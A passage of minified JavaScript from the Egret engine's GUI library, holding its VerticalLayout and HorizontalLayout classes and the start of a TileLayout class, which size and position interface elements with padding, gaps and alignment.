t=this.typicalLayoutRect?this.typicalLayoutRect.height:22,e=Math.max(this.maxElementWidth,this.typicalLayoutRect?this.typicalLayoutRect.width:71),i=this.getElementTotalSize(),n=this.target.getElementIndicesInView(),r=n.length,s=0;s<r;s++){var o=n[s],a=this.target.getElementAt(o);if(null!=a&&a.includeInLayout)var h=a.preferredWidth,i=i+a.preferredHeight,i=i-(isNaN(this.elementSizeTable[o])?t:this.elementSizeTable[o]),e=Math.max(e,h)}s=isNaN(this._padding)?0:this._padding,t=isNaN(this._paddingLeft)?s:this._paddingLeft,n=isNaN(this._paddingRight)?s:this._paddingRight,r=isNaN(this._paddingTop)?s:this._paddingTop,r+=s=isNaN(this._paddingBottom)?s:this._paddingBottom,this.target.measuredWidth=Math.ceil(e+(t+n)),this.target.measuredHeight=Math.ceil(i+r)},i.prototype.measureReal=function(){for(var t=this.target.numElements,e=t,i=0,n=0,r=0;r<t;r++){var s=this.target.getElementAt(r);if(s&&s.includeInLayout)var o=s.preferredWidth,n=n+s.preferredHeight,i=Math.max(i,o);else e--}n+=(e-1)*(t=isNaN(this._gap)?0:this._gap),s=isNaN(this._padding)?0:this._padding,e=isNaN(this._paddingLeft)?s:this._paddingLeft,t=isNaN(this._paddingRight)?s:this._paddingRight,r=isNaN(this._paddingTop)?s:this._paddingTop,r+=s=isNaN(this._paddingBottom)?s:this._paddingBottom,this.target.measuredWidth=Math.ceil(i+(e+t)),this.target.measuredHeight=Math.ceil(n+r)},i.prototype.updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,i),this.target&&(this.useVirtualLayout?this.updateDisplayListVirtual(t,i):this.updateDisplayListReal(t,i))},i.prototype.getStartPosition=function(t){var e=isNaN(this._padding)?0:this._padding,i=isNaN(this._paddingTop)?e:this._paddingTop,e=isNaN(this._gap)?0:this._gap;if(!this.useVirtualLayout){var n;return this.target&&(n=this.target.getElementAt(t)),n?n.y:i}n=this.typicalLayoutRect?this.typicalLayoutRect.height:22;for(var r=0;r<t;r++){var s=this.elementSizeTable[r];isNaN(s)&&(s=n),i+=s+e}return i},i.prototype.getElementSize=function(t){return this.useVirtualLayout?(t=this.elementSizeTable[t],isNaN(t)&&(t=this.typicalLayoutRect?this.typicalLayoutRect.height:22),t):this.target?this.target.getElementAt(t).height:0},i.prototype.getElementTotalSize=function(){for(var t=isNaN(this._gap)?0:this._gap,e=this.typicalLayoutRect?this.typicalLayoutRect.height:22,i=0,n=this.target.numElements,r=0;r<n;r++){var s=this.elementSizeTable[r];isNaN(s)&&(s=e),i+=s+t}return i-t},i.prototype.elementAdded=function(t){e.prototype.elementAdded.call(this,t),this.elementSizeTable.splice(t,0,this.typicalLayoutRect?this.typicalLayoutRect.height:22)},i.prototype.elementRemoved=function(t){e.prototype.elementRemoved.call(this,t),this.elementSizeTable.splice(t,1)},i.prototype.clearVirtualLayoutCache=function(){e.prototype.clearVirtualLayoutCache.call(this),this.elementSizeTable=[],this.maxElementWidth=0},i.prototype.findIndexAt=function(t,e,i){var n=Math.floor(.5*(e+i)),r=this.getStartPosition(n),s=this.getElementSize(n),o=isNaN(this._gap)?0:this._gap;return t>=r&&t<r+s+o?n:e==i?-1:t<r?this.findIndexAt(t,e,Math.max(e,n-1)):this.findIndexAt(t,Math.min(n+1,i),i)},i.prototype.scrollPositionChanged=function(){e.prototype.scrollPositionChanged.call(this),this.useVirtualLayout&&this.getIndexInView()&&(this.indexInViewCalculated=!0,this.target.invalidateDisplayList())},i.prototype.getIndexInView=function(){if(!this.target||0==this.target.numElements||isNaN(this.target.width)||0==this.target.width||isNaN(this.target.height)||0==this.target.height)return this.startIndex=this.endIndex=-1,!1;var t=isNaN(this._padding)?0:this._padding,e=isNaN(this._paddingTop)?t:this._paddingTop,i=isNaN(this._paddingBottom)?t:this._paddingBottom,t=this.target.numElements,n=this.getStartPosition(t-1)+this.elementSizeTable[t-1]+i,r=this.target.verticalScrollPosition;return r>n-i?(this.endIndex=this.startIndex=-1,!1):(i=this.target.verticalScrollPosition+this.target.height)<e?(this.endIndex=this.startIndex=-1,!1):(e=this.startIndex,n=this.endIndex,this.startIndex=this.findIndexAt(r,0,t-1),-1==this.startIndex&&(this.startIndex=0),this.endIndex=this.findIndexAt(i,0,t-1),-1==this.endIndex&&(this.endIndex=t-1),e!=this.startIndex||n!=this.endIndex)},i.prototype.updateDisplayListVirtual=function(e,i){this.indexInViewCalculated?this.indexInViewCalculated=!1:this.getIndexInView();var n=isNaN(this._padding)?0:this._padding,r=isNaN(this._paddingLeft)?n:this._paddingLeft,s=isNaN(this._paddingRight)?n:this._paddingRight,o=isNaN(this._paddingBottom)?n:this._paddingBottom,a=isNaN(this._gap)?0:this._gap,h=this.target.numElements;if(-1==this.startIndex||-1==this.endIndex)r=this.getStartPosition(h)-a+o,this.target.setContentSize(this.target.contentWidth,Math.ceil(r));else{this.target.setVirtualElementIndicesInView(this.startIndex,this.endIndex);var l=this._horizontalAlign==t.HorizontalAlign.JUSTIFY||this._horizontalAlign==t.HorizontalAlign.CONTENT_JUSTIFY,p=this._horizontalAlign==t.HorizontalAlign.CONTENT_JUSTIFY,u=0;l||(this._horizontalAlign==t.HorizontalAlign.CENTER?u=.5:this._horizontalAlign==t.HorizontalAlign.RIGHT&&(u=1));var d,c=Math.max(0,e-r-s),_=Math.ceil(c),g=this.typicalLayoutRect?this.typicalLayoutRect.height:22,n=Math.max(this.typicalLayoutRect?this.typicalLayoutRect.width:71,this.maxElementWidth);if(p){for(y=this.startIndex;y<=this.endIndex;y++)(d=this.target.getVirtualElementAt(y))&&d.includeInLayout&&(this.maxElementWidth=Math.max(this.maxElementWidth,d.preferredWidth));_=Math.ceil(Math.max(c,this.maxElementWidth))}for(var f=0,m=0,y=0,v=!1,E=this.startIndex;E<=this.endIndex;E++)f=0,(d=this.target.getVirtualElementAt(E))&&(d.includeInLayout?(l?(f=r,d.setLayoutBoundsSize(_,NaN)):(f=(c-d.layoutBoundsWidth)*u,f=0<f?f:0,f=r+f),p||(this.maxElementWidth=Math.max(this.maxElementWidth,d.preferredWidth)),y=Math.max(y,d.layoutBoundsWidth),v||(m=isNaN(this.elementSizeTable[E])?g:this.elementSizeTable[E])!=d.layoutBoundsHeight&&(v=!0),0==E&&0<this.elementSizeTable.length&&this.elementSizeTable[E]!=d.layoutBoundsHeight&&(this.typicalLayoutRect=null),this.elementSizeTable[E]=d.layoutBoundsHeight,m=this.getStartPosition(E),d.setLayoutBoundsPosition(Math.round(f),Math.round(m))):this.elementSizeTable[E]=0);y+=r+s,r=this.getStartPosition(h)-a+o,this.target.setContentSize(Math.ceil(y),Math.ceil(r)),(v||n<this.maxElementWidth)&&this.target.invalidateSize()}},i.prototype.updateDisplayListReal=function(e,r){var s=isNaN(this._padding)?0:this._padding,o=isNaN(this._paddingLeft)?s:this._paddingLeft,a=isNaN(this._paddingRight)?s:this._paddingRight,h=isNaN(this._paddingTop)?s:this._paddingTop,s=isNaN(this._paddingBottom)?s:this._paddingBottom,l=isNaN(this._gap)?0:this._gap,p=Math.max(0,e-o-a),u=Math.max(0,r-h-s),d=this._verticalAlign==t.VerticalAlign.JUSTIFY,c=this._horizontalAlign==t.HorizontalAlign.JUSTIFY||this._horizontalAlign==t.HorizontalAlign.CONTENT_JUSTIFY,_=0;c||(this._horizontalAlign==t.HorizontalAlign.CENTER?_=.5:this._horizontalAlign==t.HorizontalAlign.RIGHT&&(_=1));var g,f,m,y=this.target.numElements,v=y,E=o,x=h,b=0,E=0,T=[],C=u;for(g=0;g<y;g++)(f=this.target.getElementAt(g))&&f.includeInLayout?(this.maxElementWidth=Math.max(this.maxElementWidth,f.preferredWidth),d?b+=f.preferredHeight:isNaN(f.percentHeight)?C-=f.preferredHeight:(E+=f.percentHeight,m=new n,m.layoutElement=f,m.percent=f.percentHeight,m.min=f.minHeight,m.max=f.maxHeight,T.push(m))):v--;var w,C=0<(C=C-(v-1)*l)?C:0,L=u-b-l*(v-1),A=v,S=[];if(d){if(0>L){for(w=C/v,g=0;g<y;g++)(f=this.target.getElementAt(g))&&f.includeInLayout&&(f=f.preferredHeight)<=w&&(C-=f,A--);C=0<C?C:0}}else if(0<E){for(i.flexChildrenProportionally(u,C,E,T),u=0,f=T.length,g=0;g<f;g++)m=T[g],E=Math.round(m.size+u),u+=m.size-E,S[m.layoutElement.hashCode]=E,C-=E;C=0<C?C:0}for(this._verticalAlign==t.VerticalAlign.MIDDLE?x=h+.5*C:this._verticalAlign==t.VerticalAlign.BOTTOM&&(x=h+C),T=o,f=v=0,m=Math.ceil(p),this._horizontalAlign==t.HorizontalAlign.CONTENT_JUSTIFY&&(m=Math.ceil(Math.max(p,this.maxElementWidth))),u=0,v=NaN,g=0;g<y;g++)E=0,(f=this.target.getElementAt(g))&&f.includeInLayout&&(v=NaN,d?(E=NaN,0<L?E=C*f.preferredHeight/b:0>L&&f.preferredHeight>w&&(E=C/A),isNaN(E)||(v=Math.round(E+u),u+=E-v)):v=S[f.hashCode],c?(E=o,f.setLayoutBoundsSize(m,v)):(E=NaN,isNaN(f.percentWidth)||(E=Math.min(100,f.percentWidth),E=Math.round(p*E*.01)),f.setLayoutBoundsSize(E,v),E=(p-f.layoutBoundsWidth)*_,E=0<E?E:0,E=o+E),f.setLayoutBoundsPosition(Math.round(E),Math.round(x)),v=Math.ceil(f.layoutBoundsWidth),f=Math.ceil(f.layoutBoundsHeight),T=Math.max(T,E+v),h=Math.max(h,x+f),x+=f+l);this.target.setContentSize(Math.ceil(T+a),Math.ceil(h+s))},i.flexChildrenProportionally=function(t,e,i,n){var r,s=n.length;do{r=!0;var o=e-t*i/100;0<o?e-=o:o=0;for(var a=e/i,h=0;h<s;h++){var l=n[h],p=l.percent*a;if(p<l.min){r=l.min,l.size=r,n[h]=n[--s],n[s]=l,i-=l.percent,o>=r||(e-=r-o),r=!1;break}if(p>l.max){r=l.max,l.size=r,n[h]=n[--s],n[s]=l,i-=l.percent,o>=r||(e-=r-o),r=!1;break}l.size=p}}while(!r)},i}(e.LayoutBase);e.VerticalLayout=i,i.prototype.__class__="egret.gui.VerticalLayout";var n=function(){this.size=0};n.prototype.__class__="ChildInfo"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this._horizontalAlign=t.HorizontalAlign.LEFT,this._verticalAlign=t.VerticalAlign.TOP,this._gap=6,this._padding=0,this._paddingBottom=this._paddingTop=this._paddingRight=this._paddingLeft=NaN,this.elementSizeTable=[],this.endIndex=this.startIndex=-1,this.indexInViewCalculated=!1,this.maxElementHeight=0}return __extends(i,e),Object.defineProperty(i.prototype,"horizontalAlign",{get:function(){return this._horizontalAlign},set:function(t){this._horizontalAlign!=t&&(this._horizontalAlign=t,this.target&&this.target.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"verticalAlign",{get:function(){return this._verticalAlign},set:function(t){this._verticalAlign!=t&&(this._verticalAlign=t,this.target&&this.target.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"gap",{get:function(){return this._gap},set:function(t){this._gap!=t&&(this._gap=t,this.invalidateTargetSizeAndDisplayList(),this.hasEventListener("gapChanged")&&this.dispatchEventWith("gapChanged"))},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"padding",{get:function(){return this._padding},set:function(t){this._padding!=t&&(this._padding=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingLeft",{get:function(){return this._paddingLeft},set:function(t){this._paddingLeft!=t&&(this._paddingLeft=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingRight",{get:function(){return this._paddingRight},set:function(t){this._paddingRight!=t&&(this._paddingRight=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingTop",{get:function(){return this._paddingTop},set:function(t){this._paddingTop!=t&&(this._paddingTop=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingBottom",{get:function(){return this._paddingBottom},set:function(t){this._paddingBottom!=t&&(this._paddingBottom=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),i.prototype.invalidateTargetSizeAndDisplayList=function(){this.target&&(this.target.invalidateSize(),this.target.invalidateDisplayList())},i.prototype.measure=function(){e.prototype.measure.call(this),this.target&&(this.useVirtualLayout?this.measureVirtual():this.measureReal())},i.prototype.measureVirtual=function(){for(var t=this.typicalLayoutRect?this.typicalLayoutRect.height:22,e=this.typicalLayoutRect?this.typicalLayoutRect.width:71,i=this.getElementTotalSize(),t=Math.max(this.maxElementHeight,t),n=this.target.getElementIndicesInView(),r=n.length,s=0;s<r;s++){var o=n[s],a=this.target.getElementAt(o);if(null!=a&&a.includeInLayout)var h=a.preferredHeight,i=i+a.preferredWidth,i=i-(isNaN(this.elementSizeTable[o])?e:this.elementSizeTable[o]),t=Math.max(t,h)}s=isNaN(this._padding)?0:this._padding,e=isNaN(this._paddingLeft)?s:this._paddingLeft,n=isNaN(this._paddingRight)?s:this._paddingRight,r=isNaN(this._paddingTop)?s:this._paddingTop,r+=s=isNaN(this._paddingBottom)?s:this._paddingBottom,this.target.measuredWidth=Math.ceil(i+(e+n)),this.target.measuredHeight=Math.ceil(t+r)},i.prototype.measureReal=function(){for(var t=this.target.numElements,e=t,i=0,n=0,r=0;r<t;r++){var s=this.target.getElementAt(r);if(s&&s.includeInLayout)var o=s.preferredHeight,i=i+s.preferredWidth,n=Math.max(n,o);else e--}i+=(e-1)*(t=isNaN(this._gap)?0:this._gap),s=isNaN(this._padding)?0:this._padding,e=isNaN(this._paddingLeft)?s:this._paddingLeft,t=isNaN(this._paddingRight)?s:this._paddingRight,r=isNaN(this._paddingTop)?s:this._paddingTop,r+=s=isNaN(this._paddingBottom)?s:this._paddingBottom,this.target.measuredWidth=Math.ceil(i+(e+t)),this.target.measuredHeight=Math.ceil(n+r)},i.prototype.updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,i),this.target&&(this.useVirtualLayout?this.updateDisplayListVirtual(t,i):this.updateDisplayListReal(t,i))},i.prototype.getStartPosition=function(t){var e=isNaN(this._padding)?0:this._padding,i=isNaN(this._paddingLeft)?e:this._paddingLeft,e=isNaN(this._gap)?0:this._gap;if(!this.useVirtualLayout){var n;return this.target&&(n=this.target.getElementAt(t)),n?n.x:i}n=this.typicalLayoutRect?this.typicalLayoutRect.width:71;for(var r=0;r<t;r++){var s=this.elementSizeTable[r];isNaN(s)&&(s=n),i+=s+e}return i},i.prototype.getElementSize=function(t){return this.useVirtualLayout?(t=this.elementSizeTable[t],isNaN(t)&&(t=this.typicalLayoutRect?this.typicalLayoutRect.width:71),t):this.target?this.target.getElementAt(t).width:0},i.prototype.getElementTotalSize=function(){for(var t=this.typicalLayoutRect?this.typicalLayoutRect.width:71,e=isNaN(this._gap)?0:this._gap,i=0,n=this.target.numElements,r=0;r<n;r++){var s=this.elementSizeTable[r];isNaN(s)&&(s=t),i+=s+e}return i-e},i.prototype.elementAdded=function(t){this.useVirtualLayout&&(e.prototype.elementAdded.call(this,t),this.elementSizeTable.splice(t,0,this.typicalLayoutRect?this.typicalLayoutRect.width:71))},i.prototype.elementRemoved=function(t){this.useVirtualLayout&&(e.prototype.elementRemoved.call(this,t),this.elementSizeTable.splice(t,1))},i.prototype.clearVirtualLayoutCache=function(){this.useVirtualLayout&&(e.prototype.clearVirtualLayoutCache.call(this),this.elementSizeTable=[],this.maxElementHeight=0)},i.prototype.findIndexAt=function(t,e,i){var n=Math.floor(.5*(e+i)),r=this.getStartPosition(n),s=this.getElementSize(n),o=isNaN(this._gap)?0:this._gap;return t>=r&&t<r+s+o?n:e==i?-1:t<r?this.findIndexAt(t,e,Math.max(e,n-1)):this.findIndexAt(t,Math.min(n+1,i),i)},i.prototype.scrollPositionChanged=function(){e.prototype.scrollPositionChanged.call(this),this.useVirtualLayout&&this.getIndexInView()&&(this.indexInViewCalculated=!0,this.target.invalidateDisplayList())},i.prototype.getIndexInView=function(){if(!this.target||0==this.target.numElements||isNaN(this.target.width)||0==this.target.width||isNaN(this.target.height)||0==this.target.height)return this.startIndex=this.endIndex=-1,!1;var t=isNaN(this._padding)?0:this._padding,e=isNaN(this._paddingLeft)?t:this._paddingLeft,i=isNaN(this._paddingRight)?t:this._paddingRight;isNaN(this._paddingTop),isNaN(this._paddingBottom);var t=this.target.numElements,n=this.getStartPosition(t-1)+this.elementSizeTable[t-1]+i,r=this.target.horizontalScrollPosition;return r>n-i?(this.endIndex=this.startIndex=-1,!1):(i=this.target.horizontalScrollPosition+this.target.width)<e?(this.endIndex=this.startIndex=-1,!1):(e=this.startIndex,n=this.endIndex,this.startIndex=this.findIndexAt(r,0,t-1),-1==this.startIndex&&(this.startIndex=0),this.endIndex=this.findIndexAt(i,0,t-1),-1==this.endIndex&&(this.endIndex=t-1),e!=this.startIndex||n!=this.endIndex)},i.prototype.updateDisplayListVirtual=function(e,i){this.indexInViewCalculated?this.indexInViewCalculated=!1:this.getIndexInView();var n=isNaN(this._padding)?0:this._padding,r=isNaN(this._paddingRight)?n:this._paddingRight,s=isNaN(this._paddingTop)?n:this._paddingTop,o=isNaN(this._paddingBottom)?n:this._paddingBottom,a=isNaN(this._gap)?0:this._gap,h=this.target.numElements;if(-1==this.startIndex||-1==this.endIndex)r=this.getStartPosition(h)-a+r,this.target.setContentSize(Math.ceil(r),this.target.contentHeight);else{this.target.setVirtualElementIndicesInView(this.startIndex,this.endIndex);var l=this._verticalAlign==t.VerticalAlign.JUSTIFY||this._verticalAlign==t.VerticalAlign.CONTENT_JUSTIFY,p=this._verticalAlign==t.VerticalAlign.CONTENT_JUSTIFY,u=0;l||(this._verticalAlign==t.VerticalAlign.MIDDLE?u=.5:this._verticalAlign==t.VerticalAlign.BOTTOM&&(u=1));var d,c=Math.max(0,i-s-o),_=Math.ceil(c),g=this.typicalLayoutRect?this.typicalLayoutRect.width:71,n=Math.max(this.typicalLayoutRect?this.typicalLayoutRect.height:22,this.maxElementHeight);if(p){for(y=this.startIndex;y<=this.endIndex;y++)(d=this.target.getVirtualElementAt(y))&&d.includeInLayout&&(this.maxElementHeight=Math.max(this.maxElementHeight,d.preferredHeight));_=Math.ceil(Math.max(c,this.maxElementHeight))}for(var f=0,m=0,y=0,v=!1,E=this.startIndex;E<=this.endIndex;E++)m=0,(d=this.target.getVirtualElementAt(E))&&(d.includeInLayout?(l?(m=s,d.setLayoutBoundsSize(NaN,_)):(m=(c-d.layoutBoundsHeight)*u,m=0<m?m:0,m=s+m),p||(this.maxElementHeight=Math.max(this.maxElementHeight,d.preferredHeight)),y=Math.max(y,d.layoutBoundsHeight),v||(f=isNaN(this.elementSizeTable[E])?g:this.elementSizeTable[E])!=d.layoutBoundsWidth&&(v=!0),0==E&&0<this.elementSizeTable.length&&this.elementSizeTable[E]!=d.layoutBoundsWidth&&(this.typicalLayoutRect=null),this.elementSizeTable[E]=d.layoutBoundsWidth,f=this.getStartPosition(E),d.setLayoutBoundsPosition(Math.round(f),Math.round(m))):this.elementSizeTable[E]=0);y+=s+o,r=this.getStartPosition(h)-a+r,this.target.setContentSize(Math.ceil(r),Math.ceil(y)),(v||n<this.maxElementHeight)&&this.target.invalidateSize()}},i.prototype.updateDisplayListReal=function(e,r){var s=isNaN(this._padding)?0:this._padding,o=isNaN(this._paddingLeft)?s:this._paddingLeft,a=isNaN(this._paddingRight)?s:this._paddingRight,h=isNaN(this._paddingTop)?s:this._paddingTop,s=isNaN(this._paddingBottom)?s:this._paddingBottom,l=isNaN(this._gap)?0:this._gap,p=Math.max(0,e-o-a),u=Math.max(0,r-h-s),d=this._horizontalAlign==t.HorizontalAlign.JUSTIFY,c=this._verticalAlign==t.VerticalAlign.JUSTIFY||this._verticalAlign==t.VerticalAlign.CONTENT_JUSTIFY,_=0;c||(this._verticalAlign==t.VerticalAlign.MIDDLE?_=.5:this._verticalAlign==t.VerticalAlign.BOTTOM&&(_=1));var g,f,m,y=this.target.numElements,v=y,E=o,x=h,b=0,x=0,T=[],C=p;for(g=0;g<y;g++)(f=this.target.getElementAt(g))&&f.includeInLayout?(this.maxElementHeight=Math.max(this.maxElementHeight,f.preferredHeight),d?b+=f.preferredWidth:isNaN(f.percentWidth)?C-=f.preferredWidth:(x+=f.percentWidth,m=new n,m.layoutElement=f,m.percent=f.percentWidth,m.min=f.minWidth,m.max=f.maxWidth,T.push(m))):v--;var w,C=0<(C=C-l*(v-1))?C:0,L=p-b-l*(v-1),A=v,S=[];if(d){if(0>L){for(w=C/v,g=0;g<y;g++)(f=this.target.getElementAt(g))&&f.includeInLayout&&(f=f.preferredWidth)<=w&&(C-=f,A--);C=0<C?C:0}}else if(0<x){for(i.flexChildrenProportionally(p,C,x,T),p=0,f=T.length,g=0;g<f;g++)m=T[g],x=Math.round(m.size+p),p+=m.size-x,S[m.layoutElement.hashCode]=x,C-=x;C=0<C?C:0}for(this._horizontalAlign==t.HorizontalAlign.CENTER?E=o+.5*C:this._horizontalAlign==t.HorizontalAlign.RIGHT&&(E=o+C),T=h,f=v=0,m=Math.ceil(u),this._verticalAlign==t.VerticalAlign.CONTENT_JUSTIFY&&(m=Math.ceil(Math.max(u,this.maxElementHeight))),g=p=0;g<y;g++)x=0,(f=this.target.getElementAt(g))&&f.includeInLayout&&(v=NaN,d?(x=NaN,0<L?x=C*f.preferredWidth/b:0>L&&f.preferredWidth>w&&(x=C/A),isNaN(x)||(v=Math.round(x+p),p+=x-v)):v=S[f.hashCode],c?(x=h,f.setLayoutBoundsSize(v,m)):(x=NaN,isNaN(f.percentHeight)||(x=Math.min(100,f.percentHeight),x=Math.round(u*x*.01)),f.setLayoutBoundsSize(v,x),x=(u-f.layoutBoundsHeight)*_,x=0<x?x:0,x=h+x),f.setLayoutBoundsPosition(Math.round(E),Math.round(x)),v=Math.ceil(f.layoutBoundsWidth),f=Math.ceil(f.layoutBoundsHeight),o=Math.max(o,E+v),T=Math.max(T,x+f),E+=v+l);this.target.setContentSize(Math.ceil(o+a),Math.ceil(T+s))},i.flexChildrenProportionally=function(t,e,i,n){var r,s=n.length;do{r=!0;var o=e-t*i/100;0<o?e-=o:o=0;for(var a=e/i,h=0;h<s;h++){var l=n[h],p=l.percent*a;if(p<l.min){r=l.min,l.size=r,n[h]=n[--s],n[s]=l,i-=l.percent,o>=r||(e-=r-o),r=!1;break}if(p>l.max){r=l.max,l.size=r,n[h]=n[--s],n[s]=l,i-=l.percent,o>=r||(e-=r-o),r=!1;break}l.size=p}}while(!r)},i}(e.LayoutBase);e.HorizontalLayout=i,i.prototype.__class__="egret.gui.HorizontalLayout";var n=function(){this.size=0};n.prototype.__class__="ChildInfo"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.explicitHorizontalGap=NaN,this._horizontalGap=6,this.explicitVerticalGap=NaN,this._verticalGap=6,this._columnCount=-1,this._requestedColumnCount=0,this._rowCount=-1,this._requestedRowCount=0,this._rowHeight=this.explicitRowHeight=this._columnWidth=this.explicitColumnWidth=NaN,this._padding=0,this._paddingBottom=this._paddingTop=this._paddingRight=this._paddingLeft=NaN,this._horizontalAlign=t.HorizontalAlign.JUSTIFY,this._verticalAlign=t.VerticalAlign.JUSTIFY,this._columnAlign=e.ColumnAlign.LEFT,this._rowAlign=e.RowAlign.TOP,this._orientation=e.TileOrientation.ROWS,this.maxElementHeight=this.maxElementWidth=0,this.endIndex=this.startIndex=-1,this.indexInViewCalculated=!1}return __extends(n,i),Object.defineProperty(n.prototype,"horizontalGap",{get:function(){return this._horizontalGap},set:function(t){t!=this._horizontalGap&&(this._horizontalGap=this.explicitHorizontalGap=t,this.invalidateTargetSizeAndDisplayList(),this.hasEventListener("gapChanged")&&this.dispatchEventWith("gapChanged"))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"verticalGap",{get:function(){return this._verticalGap},set:function(t){t!=this._verticalGap&&(this._verticalGap=this.explicitVerticalGap=t,this.invalidateTargetSizeAndDisplayList(),this.hasEventListener("gapChanged")&&this.dispatchEventWith("gapChanged"))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"columnCount",{get:function(){return this._columnCount},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"requestedColumnCount",{get:function(){return this._requestedColumnCount},set:function(t){this._requestedColumnCount!=t&&(this._columnCount=this._requestedColumnCount=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"rowCount",{get:function(){return this._rowCount},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"requestedRowCount",{get:function(){return this._requestedRowCount},set:function(t){this._requestedRowCount!=t&&(this._rowCount=this._requestedRowCount=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"columnWidth",{get:function(){return this._columnWidth},set:function(t){t!=this._columnWidth&&(this._columnWidth=this.explicitColumnWidth=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"rowHeight",{get:function(){return this._rowHeight},set:function(t){t!=this._rowHeight&&(this._rowHeight=this.explicitRowHeight=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"padding",{get:function(){return this._padding},set:function(t){this._padding!=t&&(this._padding=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"paddingLeft",{get:function(){return this._paddingLeft},set:function(t){this._paddingLeft!=t&&(this._paddingLeft=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"paddingRight",{get:function(){return this._paddingRight},set:function(t){this._paddingRight!=t&&(this._paddingRight=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"paddingTop",{get:function(){return this._paddingTop},set:function(t){this._paddingTop!=t&&(this._paddingTop=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"paddingBottom",{get:function(){return this._paddingBottom},set:function(t){this._paddingBottom!=t&&(this._paddingBottom=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"horizontalAlign",{get:function(){return this._horizontalAlign},set:function(t){this._horizontalAlign!=t&&(this._horizontalAlign=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"verticalAlign",{get:function(){return this._verticalAlign},set:function(t){this._verticalAlign!=t&&(this._verticalAlign=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"columnAlign",{get:function(){return this._columnAlign},set:function(t){this._columnAlign!=t&&(this._columnAlign=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"rowAlign",{get:function(){return this._rowAlign},set:function(t){this._rowAlign!=t&&(this._rowAlign=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"orientation",{get:function(){return this._orientation},set:function(t){this._orientation!=t&&(this._orientation=t,this.invalidateTargetSizeAndDisplayList(),this.hasEventListener("orientationChanged")&&this.dispatchEventWith("orientationChanged"))},enumerable:!0,configurable:!0}),n.prototype.invalidateTargetSizeAndDisplayList=function(){this.target&&(this.target.invalidateSize(),this.target.invalidateDisplayList())},n.prototype.measure=function(){if(this.target){var t=this._columnCount,e=this._rowCount,i=this._columnWidth,n=this._rowHeight,r=0,s=0;this.calculateRowAndColumn(this.target.explicitWidth,this.target.explicitHeight);var o=0<this._requestedColumnCount?this._requestedColumnCount:this._columnCount,a=0<this._requestedRowCount?this._requestedRowCount:this._rowCount,h=isNaN(this._horizontalGap)?0:this._horizontalGap,l=isNaN(this._verticalGap)?0:this._verticalGap;0<o&&(r=o*(this._columnWidth+h)-h),0<a&&(s=a*(this._rowHeight+l)-l),l=isNaN(this._padding)?0:this._padding,o=isNaN(this._paddingLeft)?l:this._paddingLeft,a=isNaN(this._paddingRight)?l:this._paddingRight,h=isNaN(this._paddingTop)?l:this._paddingTop,h+=l=isNaN(this._paddingBottom)?l:this._paddingBottom,this.target.measuredWidth=Math.ceil(r+(o+a)),this.target.measuredHeight=Math.ceil(s+h),this._columnCount=t,this._rowCount=e,this._columnWidth=i,this._rowHeight=n}},n.prototype.calculateRowAndColumn=function(t,i){var n=isNaN(this._horizontalGap)?0:this._horizontalGap,r=isNaN(this._verticalGap)?0:this._verticalGap;this._rowCount=this._columnCount=-1;for(var s=this.target.numElements,o=s,a=0;a<o;a++){(h=this.target.getElementAt(a))&&!h.includeInLayout&&s--}if(0==s)this._rowCount=this._columnCount=0;else{(isNaN(this.explicitColumnWidth)||isNaN(this.explicitRowHeight))&&this.updateMaxElementSize(),isNaN(this.explicitColumnWidth)?this._columnWidth=this.maxElementWidth:this._columnWidth=this.explicitColumnWidth,isNaN(this.explicitRowHeight)?this._rowHeight=this.maxElementHeight:this._rowHeight=this.explicitRowHeight,0>=(o=this._columnWidth+n)&&(o=1),0>=(a=this._rowHeight+r)&&(a=1);var 